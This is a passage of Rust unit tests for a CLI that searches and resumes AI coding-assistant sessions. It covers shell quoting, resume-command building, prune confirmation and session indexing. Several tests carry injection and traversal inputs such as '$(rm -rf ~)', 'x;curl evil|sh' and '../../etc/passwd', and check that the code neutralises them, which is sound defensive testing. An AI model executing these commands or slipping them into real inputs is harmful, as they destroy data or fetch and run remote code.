        inject_full_content(&mut not_an_array, &search, 300);

        assert!(not_an_array.get("full_content").is_none());
    }

    #[test]
    fn test_row_message_uuid_reads_top_level() {
        let row = serde_json::json!({"message_uuid": "abc-123"});
        assert_eq!(row_message_uuid(&row).as_deref(), Some("abc-123"));
    }

    #[test]
    fn test_row_message_uuid_reads_flattened_grouped_row() {
        // GroupedRow flattens its representative, so the uuid sits next to match_count.
        let row = serde_json::json!({"message_uuid": "abc-123", "match_count": 5});
        assert_eq!(row_message_uuid(&row).as_deref(), Some("abc-123"));
    }

    #[test]
    fn test_row_message_uuid_absent_is_none() {
        let row = serde_json::json!({"session_id": "s1", "conversation_summary": "x"});
        assert_eq!(row_message_uuid(&row), None);
    }

    #[test]
    fn test_truncate_chars_shorter_than_max_is_untouched() {
        assert_eq!(truncate_chars("hello", 300), ("hello".to_string(), false));
    }

    #[test]
    fn test_truncate_chars_exact_length_is_not_marked_dropped() {
        // The off-by-one that printed a bare "..." after complete messages.
        assert_eq!(truncate_chars("abcde", 5), ("abcde".to_string(), false));
    }

    #[test]
    fn test_truncate_chars_longer_is_cut_and_flagged() {
        assert_eq!(truncate_chars("abcdef", 5), ("abcde".to_string(), true));
    }

    #[test]
    fn test_truncate_chars_multibyte_boundary() {
        // Byte slicing here would panic; chars() must count codepoints.
        let (out, dropped) = truncate_chars("日本語のテキスト", 3);
        assert_eq!(out, "日本語");
        assert!(dropped);
    }

    #[test]
    fn test_highlight_query_ascii_case_insensitive() {
        let out = highlight_query("Use PICK to pick sessions", "pick");
        assert_eq!(
            out,
            "Use \x1b[1;31mPICK\x1b[0m to \x1b[1;31mpick\x1b[0m sessions"
        );
    }

    #[test]
    fn test_highlight_query_empty_is_passthrough() {
        assert_eq!(highlight_query("hello", ""), "hello");
    }

    #[test]
    fn test_highlight_query_no_byte_boundary_panic_on_japanese() {
        // The needle is ASCII so matches are ASCII bytes, which are always
        // char boundaries in UTF-8 — multibyte text around them must survive.
        let out = highlight_query("日本語のpickテキストpick終わり", "pick");
        assert_eq!(
            out,
            "日本語の\x1b[1;31mpick\x1b[0mテキスト\x1b[1;31mpick\x1b[0m終わり"
        );
        // A non-ASCII needle falls back to a plain substring search; it must
        // not panic either.
        let out = highlight_query("日本語のテキスト", "日本語");
        assert!(out.contains("\x1b[1;31m日本語\x1b[0m"));
    }

    #[test]
    fn test_normalize_preview_query_trims_and_drops_empty() {
        assert_eq!(
            normalize_preview_query(Some("  auth  ")),
            Some("auth".to_string())
        );
        assert_eq!(normalize_preview_query(Some("   ")), None);
        assert_eq!(normalize_preview_query(None), None);
    }

    #[test]
    fn test_preview_body_matches_is_case_insensitive() {
        assert!(preview_body_matches("Use PICK here", Some("pick")));
        assert!(preview_body_matches("日本語pickテキスト", Some("PICK")));
        assert!(!preview_body_matches("nothing here", Some("pick")));
        assert!(!preview_body_matches("anything", None));
        assert!(!preview_body_matches("anything", Some("  ")));
    }

    #[test]
    fn test_preview_color_respects_flags() {
        // Pure-function half of the decision — no env access, so no
        // process-global mutation from tests.
        assert!(!preview_color_enabled_with(true, false, false, true));
        assert!(!preview_color_enabled_with(false, true, false, true));
        assert!(!preview_color_enabled_with(false, false, false, false));
        assert!(preview_color_enabled_with(false, false, false, true));
        // CLICOLOR_FORCE re-enables piped output (fzf preview pane); NO_COLOR wins over it.
        assert!(preview_color_enabled_with(false, false, true, false));
        assert!(!preview_color_enabled_with(false, true, true, false));
    }

    #[test]
    fn test_truncate_chars_zero_max() {
        assert_eq!(truncate_chars("abc", 0), (String::new(), true));
    }

    #[test]
    fn test_truncate_chars_zero_max_on_empty_input() {
        // Nothing was dropped, so nothing should claim otherwise.
        assert_eq!(truncate_chars("", 0), (String::new(), false));
    }

    fn tree_fixture(warning: Option<&str>, error: Option<&str>) -> crate::search::ConversationTree {
        crate::search::ConversationTree {
            conversation: None,
            tree: Vec::new(),
            total_messages: 0,
            warning: warning.map(String::from),
            error: error.map(String::from),
        }
    }

    #[test]
    fn test_tree_exit_code_error_is_failure() {
        assert_eq!(
            tree_exit_code(&tree_fixture(None, Some("Conversation x not found"))),
            1
        );
    }

    #[test]
    fn test_tree_exit_code_warning_still_succeeds() {
        // Partial data is still data; a non-zero exit would tell callers to discard it.
        assert_eq!(
            tree_exit_code(&tree_fixture(Some("Showing 3 of 10 message(s)."), None)),
            0
        );
    }

    #[test]
    fn test_tree_exit_code_clean_is_zero() {
        assert_eq!(tree_exit_code(&tree_fixture(None, None)), 0);
    }

    /// `confirm_prune` with an explicit answer on a simulated terminal.
    fn confirm_with_input(answer: &str) -> bool {
        let mut reader = std::io::Cursor::new(answer.as_bytes().to_vec());
        confirm_prune(5, false, true, &mut reader).unwrap()
    }

    #[test]
    fn test_confirm_prune_yes_flag_skips_stdin() {
        // Must not read the reader at all -- this is the path scripts and agents take.
        // An empty reader would return EOF, which parses as "no", so a passing assertion
        // here proves --yes short-circuits before any read.
        let mut empty = std::io::Cursor::new(Vec::new());
        assert!(confirm_prune(5, true, false, &mut empty).unwrap());
    }

    #[test]
    fn test_confirm_prune_refuses_without_tty() {
        let mut reader = std::io::Cursor::new(b"y\n".to_vec());
        let err = confirm_prune(5, false, false, &mut reader)
            .expect_err("non-TTY without --yes must be refused");
        assert!(
            err.to_string().contains("--yes"),
            "error should name the flag that unblocks it, got: {}",
            err
        );
        // The refusal must not depend on what was piped in: a script echoing "y" into the
        // command must still be refused, not silently obeyed.
        assert_eq!(reader.position(), 0, "stdin must not be consumed");
    }

    #[test]
    fn test_confirm_prune_accepts_yes_spellings() {
        for answer in ["y\n", "Y\n", "yes\n", "YES\n", " y \n"] {
            assert!(confirm_with_input(answer), "answer = {:?}", answer);
        }
    }

    #[test]
    fn test_confirm_prune_rejects_everything_else() {
        // "" is a bare Enter and "" via EOF is a closed stdin; neither is consent.
        // "yesterday" is the case a `starts_with("y")` implementation would get wrong.
        for answer in ["\n", "", "n\n", "no\n", "yesterday\n", "sure\n"] {
            assert!(!confirm_with_input(answer), "answer = {:?}", answer);
        }
    }

    #[test]
    fn test_shell_quote_leaves_ordinary_paths_alone() {
        assert_eq!(
            shell_quote("/Users/me/ghq/github.com/a/b-c_d.e"),
            "/Users/me/ghq/github.com/a/b-c_d.e"
        );
        assert_eq!(
            shell_quote("9ef036cc-e7e3-4066-b304-db797421ba42"),
            "9ef036cc-e7e3-4066-b304-db797421ba42"
        );
    }

    #[test]
    fn test_shell_quote_space() {
        assert_eq!(shell_quote("/My Projects/app"), "'/My Projects/app'");
    }

    #[test]
    fn test_shell_quote_command_substitution_is_inert() {
        assert_eq!(shell_quote("/tmp/$(rm -rf ~)"), "'/tmp/$(rm -rf ~)'");
        assert_eq!(shell_quote("/tmp/`id`"), "'/tmp/`id`'");
    }

    #[test]
    fn test_shell_quote_semicolon_and_pipe() {
        assert_eq!(shell_quote("/tmp/x;curl evil|sh"), "'/tmp/x;curl evil|sh'");
    }

    #[test]
    fn test_shell_quote_embedded_single_quote() {
        // Close, escape, reopen: `it's` must survive one round of shell parsing intact.
        assert_eq!(shell_quote("/tmp/it's"), r"'/tmp/it'\''s'");
    }

    #[test]
    fn test_shell_quote_empty_is_quoted_not_dropped() {
        // Unquoted, an empty string vanishes and `cd '' && ...` becomes `cd && ...`.
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn test_shell_quote_non_ascii_is_quoted() {
        // Japanese paths are ordinary here; they must land in the quoted branch rather
        // than being treated as safe by an ASCII-only allowlist that ignores them.
        assert_eq!(
            shell_quote("/Users/me/開発/アプリ"),
            "'/Users/me/開発/アプリ'"
        );
    }

    #[test]
    fn test_build_resume_command_quotes_hostile_project_path() {
        let cmd = build_resume_command("/tmp/x; touch pwned", "abc-123", "claude").unwrap();
        assert_eq!(
            cmd,
            "cd -- '/tmp/x; touch pwned' && claude --resume abc-123"
        );
    }

    #[test]
    fn test_build_resume_command_terminates_options_for_dash_leading_path() {
        // All-safe characters, so quoting alone would leave `cd -Users-x` reading its
        // argument as flags. The `--` is what actually closes this.
        let cmd = build_resume_command("-Users-x", "abc-123", "claude").unwrap();
        assert!(cmd.starts_with("cd -- -Users-x &&"), "got: {}", cmd);
    }

    #[test]
    fn test_build_resume_command_refused_for_control_characters() {
        // A newline would split the picker's tab-separated line and hand `eval` a fragment.
        assert!(build_resume_command("/tmp/a\nb", "abc-123", "claude").is_none());
        assert!(build_resume_command("/tmp/a\tb", "abc-123", "claude").is_none());
        // A NUL truncates the string for the consuming shell, leaving the quote unclosed.
        assert!(build_resume_command("/tmp/a\0b", "abc-123", "claude").is_none());
        assert!(build_resume_command("/tmp/ok", "abc\n123", "claude").is_none());
    }

    #[test]
    fn test_build_resume_command_refused_for_dash_leading_session_id() {
        // Whether `claude --resume` honours a `--` separator is that CLI's contract, so a
        // command that cannot be proven safe is not emitted at all.
        assert!(build_resume_command("/tmp/ok", "-x", "claude").is_none());
    }

    #[test]
    fn test_inject_resume_command_emits_null_when_unsafe() {
        let mut v = serde_json::json!([{
            "session_id": "abc-123",
            "project_path": "/tmp/a\nb",
            "source": "claude_code"
        }]);
        inject_resume_command(&mut v);
        assert!(v[0]["resume_command"].is_null());
    }

    #[test]
    fn test_inject_resume_command_quotes_hostile_project_path() {
        let mut v = serde_json::json!([{
            "session_id": "abc-123",
            "project_path": "/tmp/x; touch pwned",
            "source": "claude_code"
        }]);
        inject_resume_command(&mut v);
        let cmd = v[0]["resume_command"].as_str().unwrap();
        assert!(
            cmd.starts_with("cd -- '/tmp/x; touch pwned' && "),
            "got: {}",
            cmd
        );
    }

    fn resume_test_conn() -> rusqlite::Connection {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        conn.execute_batch("PRAGMA foreign_keys = OFF;").unwrap();
        conn.execute_batch(include_str!("../data/schema.sql"))
            .unwrap();
        conn
    }

    fn insert_conversation(
        conn: &rusqlite::Connection,
        session_id: &str,
        source: &str,
        project_path: Option<&str>,
    ) {
        conn.execute(
            "INSERT INTO conversations (session_id, source, project_path, message_count) VALUES (?, ?, ?, 1)",
            rusqlite::params![session_id, source, project_path],
        )
        .unwrap();
    }

    fn insert_message(conn: &rusqlite::Connection, uuid: &str, session_id: &str) {
        conn.execute(
            "INSERT INTO messages (message_uuid, session_id, depth, timestamp, message_type, project_path, full_content)
             VALUES (?, ?, 0, '2025-01-15T10:00:00', 'user', '/proj', 'body')",
            rusqlite::params![uuid, session_id],
        )
        .unwrap();
    }

    #[test]
    fn test_cmd_resume_spec_claude_row() {
        let dir = tempfile::tempdir().unwrap();
        let proj = dir.path().to_str().unwrap().to_string();
        let target = ResumeTarget {
            source: "claude_code".to_string(),
            session_id: "abc-123".to_string(),
            project_path: Some(proj.clone()),
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert_eq!(spec.binary.as_deref(), Some("claude"));
        assert_eq!(
            spec.args,
            vec!["--resume".to_string(), "abc-123".to_string()]
        );
        assert_eq!(spec.project_exists, Some(true));
        assert!(spec.resume_command.is_some());
        assert!(spec.error.is_none());
        assert_eq!(spec.project_path.as_deref(), Some(proj.as_str()));
    }

    #[test]
    fn test_cmd_resume_spec_opencode_is_null_with_note() {
        let target = ResumeTarget {
            source: "opencode".to_string(),
            session_id: "oc:ses_abc".to_string(),
            project_path: Some("/tmp/proj".to_string()),
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert!(spec.resume_command.is_none());
        assert!(spec.binary.is_none());
        assert!(spec.args.is_empty());
        assert_eq!(spec.note.as_deref(), Some("resumed with their own tools"));
    }

    #[test]
    fn test_cmd_resume_spec_codex_is_null_with_note() {
        let target = ResumeTarget {
            source: "codex".to_string(),
            session_id: "codex:019e72d8".to_string(),
            project_path: Some("/tmp/proj".to_string()),
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert!(spec.resume_command.is_none());
        assert!(spec.binary.is_none());
    }

    #[test]
    fn test_cmd_resume_spec_unsafe_path_is_null_with_error() {
        let target = ResumeTarget {
            source: "claude_code".to_string(),
            session_id: "abc-123".to_string(),
            project_path: Some("/tmp/a\nb".to_string()),
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert!(spec.resume_command.is_none());
        assert_eq!(spec.error.as_deref(), Some("unsafe_path"));
        // `project_exists` still reports the stat; it must not panic.
        assert!(spec.project_exists.is_some());
    }

    #[test]
    fn test_cmd_resume_spec_no_project_path() {
        let target = ResumeTarget {
            source: "claude_code".to_string(),
            session_id: "abc-123".to_string(),
            project_path: None,
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert!(spec.resume_command.is_none());
        assert_eq!(spec.error.as_deref(), Some("no_project_path"));
        assert_eq!(spec.project_exists, None);
    }

    #[test]
    fn test_matches_exclude_project_partial_or_and_empty() {
        assert!(matches_exclude_project(
            Some("/a/.claude-mem/observer-sessions/x"),
            &["observer".to_string()]
        ));
        // Multiple patterns are OR.
        assert!(matches_exclude_project(
            Some("/private/tmp/scratch"),
            &["observer".to_string(), "tmp".to_string(),]
        ));
        // Unrelated rows survive.
        assert!(!matches_exclude_project(
            Some("/home/user/proj"),
            &["observer".to_string(), "tmp".to_string()],
        ));
        // Empty list never excludes; None is never excluded.
        assert!(!matches_exclude_project(Some("/tmp/x"), &[]));
        assert!(!matches_exclude_project(None, &["tmp".to_string()]));
        // ASCII case-insensitive, mirroring LIKE.
        assert!(matches_exclude_project(
            Some("/TMP/ObServer/x"),
            &["observer".to_string()]
        ));
    }

    #[test]
    fn test_matches_exclude_repo_hits_repo_root_only() {
        assert!(matches_exclude_repo(
            Some("/repos/meetsone"),
            &["meetsone".to_string()]
        ));
        assert!(!matches_exclude_repo(
            Some("/repos/meetsone"),
            &["other".to_string()]
        ));
        assert!(!matches_exclude_repo(None, &["meetsone".to_string()]));
        assert!(!matches_exclude_repo(Some("/repos/meetsone"), &[]));
    }

    #[test]
    fn test_project_basename_last_segment() {
        assert_eq!(
            project_basename(Some("/a/b/meetsone")),
            Some("meetsone".to_string())
        );
        // Trailing slash still yields the real segment.
        assert_eq!(
            project_basename(Some("/a/b/meetsone/")),
            Some("meetsone".to_string())
        );
        // Multibyte boundaries cannot panic.
        assert_eq!(
            project_basename(Some("/tmp/日本語プロジェクト")),
            Some("日本語プロジェクト".to_string())
        );
        assert_eq!(project_basename(Some("")), None);
        assert_eq!(project_basename(None), None);
    }

    #[test]
    fn test_matches_here_prefix_with_boundary() {
        assert!(matches_here(Some("/a/b"), "/a/b"));
        assert!(matches_here(Some("/a/b/c"), "/a/b"));
        // Sibling with a shared string prefix is not under cwd.
        assert!(!matches_here(Some("/a/bc"), "/a/b"));
        assert!(!matches_here(Some("/other"), "/a/b"));
        assert!(!matches_here(None, "/a/b"));
    }

    #[test]
    fn test_fetch_filling_refills_and_recomputes_truncated() {
        let corpus: Vec<i64> = (1..=10).collect();
        // Keep odd numbers only; requested 3 fills from a longer prefix.
        let (rows, truncated) = fetch_filling(
            3,
            |fetch_limit| {
                let take = (fetch_limit as usize).min(corpus.len());
                let truncated = corpus.len() > take;
                Ok((corpus[..take].to_vec(), truncated, ()))
            },
            |n: &i64, _: &()| n % 2 == 1,
        )
        .unwrap();
        assert_eq!(rows, vec![1, 3, 5]);
        assert!(truncated);
    }

    #[test]
    fn test_fetch_filling_exhausted_is_exact() {
        let corpus: Vec<i64> = (1..=5).collect();
        // Requesting more than survive drains the corpus: exact, not truncated.
        let (rows, truncated) = fetch_filling(
            100,
            |fetch_limit| {
                let take = (fetch_limit as usize).min(corpus.len());
                let truncated = corpus.len() > take;
                Ok((corpus[..take].to_vec(), truncated, ()))
            },
            |n: &i64, _: &()| n % 2 == 1,
        )
        .unwrap();
        assert_eq!(rows, vec![1, 3, 5]);
        assert!(!truncated);
    }

    #[test]
    fn test_fetch_filling_round_cap_returns_partial_truncated() {
        // Nothing survives, corpus never exhausts: rounds stop the loop.
        let corpus: Vec<i64> = (1..=10_000).collect();
        let mut calls = 0;
        let (rows, truncated) = fetch_filling(
            3,
            |fetch_limit| {
                calls += 1;
                let take = (fetch_limit as usize).min(corpus.len());
                let truncated = corpus.len() > take;
                Ok((corpus[..take].to_vec(), truncated, ()))
            },
            |_: &i64, _: &()| false,
        )
        .unwrap();
        assert!(rows.is_empty());
        assert!(truncated);
        assert!(calls <= 3, "bounded queries, got {}", calls);
    }

    #[test]
    fn test_inject_project_fields_null_path_is_null() {
        let mut v = serde_json::json!([
            {"session_id": "s1", "project_path": "/definitely/not/here-12345"},
            {"session_id": "s2", "project_path": None::<String>},
            {"no_session": true},
        ]);
        inject_project_fields(&mut v);
        let rows = v.as_array().unwrap();
        assert_eq!(rows[0]["project_exists"], serde_json::Value::Bool(false));
        assert_eq!(
            rows[0]["project_basename"],
            serde_json::Value::String("here-12345".to_string())
        );
        assert!(rows[1]["project_exists"].is_null());
        assert!(rows[1]["project_basename"].is_null());
        // Objects without session_id are untouched.
        assert!(rows[2].get("project_exists").is_none());
    }

    #[test]
    fn test_resume_spec_carries_project_basename() {
        let target = ResumeTarget {
            source: "claude_code".to_string(),
            session_id: "abc-123".to_string(),
            project_path: Some("/home/user/myproj".to_string()),
            model: None,
        };
        let spec = build_resume_spec_with_cmd(&target, "claude");
        assert_eq!(spec.project_basename.as_deref(), Some("myproj"));
    }

    #[test]
    fn test_cmd_resume_spec_ambiguous_prefix_reports_matches() {
        let conn = resume_test_conn();
        insert_conversation(
            &conn,
            "beefcafe-1111-3333-4444-555555555555",
            "claude_code",
            Some("/tmp/a"),
        );
        insert_conversation(
            &conn,
            "beefcafe-2222-3333-4444-555555555555",
            "claude_code",
            Some("/tmp/b"),
        );
        let err = resolve_resume_target_with_conn(&conn, "beefcafe").unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("matches 2"),
            "expected match count in error, got: {}",
            msg
        );
    }

    #[test]
    fn test_resolve_resume_target_prefers_exact_and_prefix() {
        let conn = resume_test_conn();
        insert_conversation(
            &conn,
            "abcdef01-2222-3333-4444-555555555555",
            "claude_code",
            Some("/tmp/proj"),
        );
        let target = resolve_resume_target_with_conn(&conn, "abcdef01").unwrap();
        assert_eq!(target.session_id, "abcdef01-2222-3333-4444-555555555555");
        let full =
            resolve_resume_target_with_conn(&conn, "abcdef01-2222-3333-4444-555555555555").unwrap();
        assert_eq!(full.session_id, target.session_id);
    }

    #[test]
    fn test_resolve_resume_target_accepts_message_uuid() {
        let conn = resume_test_conn();
        insert_conversation(&conn, "sess-1", "claude_code", Some("/tmp/proj"));
        insert_message(&conn, "msg-uuid-1", "sess-1");
        let target = resolve_resume_target_with_conn(&conn, "msg-uuid-1").unwrap();
        assert_eq!(target.session_id, "sess-1");
        assert_eq!(target.project_path.as_deref(), Some("/tmp/proj"));
    }

    #[test]
    fn test_resolve_resume_target_rejects_dash_and_control() {
        let conn = resume_test_conn();
        let err = resolve_resume_target_with_conn(&conn, "-x").unwrap_err();
        assert!(err.to_string().contains('-'));
        let err = resolve_resume_target_with_conn(&conn, "ab\ncd").unwrap_err();
        assert!(!err.to_string().is_empty());
    }

    #[test]
    fn test_parse_resume_binary_strips_env_assignments() {
        assert_eq!(
            parse_resume_binary("env FOO=1 claude").as_deref(),
            Some("claude")
        );
        assert_eq!(parse_resume_binary("claude").as_deref(), Some("claude"));
        assert_eq!(parse_resume_binary("").as_deref(), None);
        assert_eq!(parse_resume_binary("env FOO=1").as_deref(), None);
    }

    #[test]
    fn test_is_stamp_stale_missing_file() {
        let path = unique_stamp_path("missing");
        let _ = std::fs::remove_file(&path);
        assert!(is_stamp_stale(&path, 300));
    }

    #[test]
    fn test_hook_ttl_is_shorter_than_the_shared_one_but_not_zero() {
        // Well under the shared 300s so the hook is not a no-op for the session that just
        // produced a turn, but not 0: Stop fires every turn, and an always-stale stamp
        // would sweep every project directory each time.
        assert!(hook_index_ttl_secs(None) > 0);
        assert!(hook_index_ttl_secs(None) < AUTO_INDEX_TTL_SECS);
        assert_eq!(hook_index_ttl_secs(Some("120".into())), 120);
        // Unparseable falls back to the default rather than to the shared 300s.
        assert_eq!(
            hook_index_ttl_secs(Some("soon".into())),
            HOOK_INDEX_TTL_SECS
        );
    }

    #[test]
    fn test_zero_ttl_treats_a_fresh_stamp_as_stale() {
        let path = unique_stamp_path("zero-ttl");
        touch_stamp_at(&path);
        assert!(is_stamp_stale(&path, 0));
    }

    #[test]
    fn test_is_stamp_stale_fresh() {
        let path = unique_stamp_path("fresh");
        touch_stamp_at(&path);
        assert!(!is_stamp_stale(&path, 300));
    }

    #[test]
    fn test_is_stamp_stale_expired() {
        let path = unique_stamp_path("expired");
        touch_stamp_at(&path);
        // TTL=0 means always stale
        assert!(is_stamp_stale(&path, 0));
    }

    #[test]
    fn test_touch_stamp_at_creates_nested_dirs() {
        let dir = std::env::temp_dir().join(format!("conv-search-nested-{}", std::process::id()));
        let path = dir.join("subdir").join("stamp");
        let _ = std::fs::remove_dir_all(&dir);

        touch_stamp_at(&path);
        assert!(path.exists());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_touch_stamp_at_updates_mtime() {
        let path = unique_stamp_path("mtime");

        touch_stamp_at(&path);
        let mtime1 = std::fs::metadata(&path).unwrap().modified().unwrap();

        std::thread::sleep(std::time::Duration::from_millis(50));

        touch_stamp_at(&path);
        let mtime2 = std::fs::metadata(&path).unwrap().modified().unwrap();

        assert!(mtime2 > mtime1);
    }

    #[test]
    fn test_is_stamp_stale_boundary() {
        let path = unique_stamp_path("boundary");
        touch_stamp_at(&path);

        // Freshly written stamp with huge TTL is not stale
        assert!(!is_stamp_stale(&path, u64::MAX));
        // TTL=0 means always stale
        assert!(is_stamp_stale(&path, 0));
    }
}

#[cfg(test)]
mod index_single_session_tests {
    use super::{index_single_session, lookup_tree, transcript_lookup_key, TargetedIndex};
    use crate::indexer::ConversationIndexer;
    use crate::search::ConversationSearch;

    #[test]
    fn rejects_non_claude_code_sources() {
        // OpenCode and Codex sessions do not live in ~/.claude*/projects/<project>/<id>.jsonl.
        assert_eq!(
            transcript_lookup_key("oc:abcdef12-3456-7890-abcd-ef1234567890"),
            None
        );
        assert_eq!(
            transcript_lookup_key("codex:abcdef12-3456-7890-abcd-ef1234567890"),
            None
        );
    }

    #[test]
    fn rejects_ids_too_short_to_identify_a_session() {
        assert_eq!(transcript_lookup_key("abc"), None);
        assert_eq!(transcript_lookup_key("deadbee"), None);
    }

    #[test]
    fn rejects_ids_that_cannot_be_a_uuid() {
        // Guards the directory sweep. tests/test_pick.sh passes exactly this kind of value.
        assert_eq!(transcript_lookup_key("definitely-no-such-session-id"), None);
        assert_eq!(transcript_lookup_key("../../etc/passwd"), None);
    }

    #[test]
    fn accepts_a_uuid_and_a_prefix_of_one_lowercased() {
        assert_eq!(
            transcript_lookup_key("DEADBEEF-1111-2222-3333-444444444444"),
            Some("deadbeef-1111-2222-3333-444444444444".to_string())
        );
        assert_eq!(
            transcript_lookup_key("deadbeef"),
            Some("deadbeef".to_string())
        );
    }

    /// The one test that proves the retry actually works end to end.
    ///
    /// Every other assertion here checks that some input is *rejected*, which a lookup that
    /// silently finds nothing would also satisfy. Without this one, a discovery bug that
    /// matched no files at all would leave the whole module green.
    #[test]
    fn indexes_a_missing_session_and_returns_its_tree() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "deadbeef-1111-2222-3333-444444444444";
        std::fs::write(
            project.join(format!("{}.jsonl", session)),
            format!(
                "{}\n{}\n",
                format_args!(
                    r#"{{"uuid":"m1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"how do I widen the search window"}}}}"#
                ),
                format_args!(
                    r#"{{"uuid":"m2","parentUuid":"m1","isSidechain":false,"timestamp":"2026-01-15T10:01:00Z","type":"assistant","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"assistant","content":[{{"type":"text","text":"pass --days to widen it"}}]}}}}"#
                ),
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        // The DB must already exist: a read path is never allowed to create one.
        ConversationIndexer::new(db_path, true).unwrap();

        let before = ConversationSearch::new(db_path)
            .unwrap()
            .get_conversation_tree(session)
            .unwrap();
        assert!(before.error.is_some(), "precondition: session is unindexed");

        let tree = lookup_tree(db_path, session, Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 2);
        assert_eq!(tree.tree.len(), 1, "one root message");
        assert_eq!(tree.tree[0].children.len(), 1, "one reply under it");
    }

    /// A prefix has to work too: an agent copying a short id out of `search` output is the
    /// common case, and `resolve_session_id` accepts prefixes on the indexed path already.
    #[test]
    fn indexes_a_missing_session_given_only_a_prefix() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "abcdef01-2222-3333-4444-555555555555";
        std::fs::write(
            project.join(format!("{}.jsonl", session)),
            format!(
                "{}\n",
                format_args!(
                    r#"{{"uuid":"p1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"only message"}}}}"#
                )
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        ConversationIndexer::new(db_path, true).unwrap();

        let tree = lookup_tree(db_path, "abcdef01", Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 1);
    }

    /// `prune-observer` (and any interrupted run) can leave a `claude_code_sync_state` row
    /// behind with no conversation rows. Without `set_force`, the mtime check would then
    /// short-circuit the re-read and the retry would be a silent no-op.
    #[test]
    fn reindexes_a_session_whose_sync_state_outlived_its_rows() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "feedface-9999-8888-7777-666666666666";
        let file = project.join(format!("{}.jsonl", session));
        std::fs::write(
            &file,
            format!(
                "{}\n",
                format_args!(
                    r#"{{"uuid":"s1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"still recoverable"}}}}"#
                )
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();

        let mut indexer = ConversationIndexer::new(db_path, true).unwrap();
        indexer.index_conversation(&file).unwrap();
        // Drop the content but keep sync_state, exactly what prune leaves behind.
        indexer
            .connection()
            .execute_batch("DELETE FROM messages; DELETE FROM conversations;")
            .unwrap();
        let stamped: i64 = indexer
            .connection()
            .query_row("SELECT COUNT(*) FROM claude_code_sync_state", [], |r| {
                r.get(0)
            })
            .unwrap();
        assert_eq!(stamped, 1, "precondition: the file is still stamped");
        drop(indexer);

        let tree = lookup_tree(db_path, session, Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 1);
    }

    #[test]
    fn refuses_to_create_a_database_from_a_read_path() {
        let dir = tempfile::tempdir().unwrap();
        let missing = dir.path().join("absent.db");
        assert!(matches!(
            index_single_session(
                missing.to_str().unwrap(),
                "deadbeef-1111-2222-3333-444444444444",
                None
            ),
            TargetedIndex::Failed(_)
        ));
        assert!(!missing.exists(), "tree must never build an index database");
    }

    /// A prefix that names several transcripts is something the user can fix by typing more
    /// characters. Reporting it as "not found" sends them looking for a session that is on
    /// disk the whole time.
    #[test]
    fn an_ambiguous_prefix_is_reported_as_such_not_as_missing() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();
        for suffix in ["1111", "2222"] {
            let id = format!("beefcafe-{}-3333-4444-555555555555", suffix);
            std::fs::write(
                project.join(format!("{}.jsonl", id)),
                format!(
                    "{}\n",
                    format_args!(
                        r#"{{"uuid":"x{suffix}","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{id}","cwd":"/tmp/someproject","message":{{"role":"user","content":"hello"}}}}"#
                    )
                ),
            )
            .unwrap();
        }

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        ConversationIndexer::new(db_path, true).unwrap();

        let tree = lookup_tree(db_path, "beefcafe", Some(&roots)).unwrap();
        let error = tree
            .error
            .expect("an unresolvable prefix is still an error");
        assert!(
            error.contains("matches 2 transcripts"),
            "expected an ambiguity message, got: {}",
            error
        );
    }

    /// An observer transcript is skipped by design, so the retry cannot help. Saying "not
    /// found" hides both that the file exists and that there is an env var to include it.
    #[test]
    fn an_excluded_transcript_says_so_rather_than_reporting_nothing() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        // Not the observer *directory* name -- that is skipped before this code sees it.
        // This is the content backstop inside do_index_conversation.
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();
        let id = "0bbe0bbe-1111-2222-3333-444444444444";
        std::fs::write(
            project.join(format!("{}.jsonl", id)),
            format!(
                "{}\n{}\n",
                format_args!(
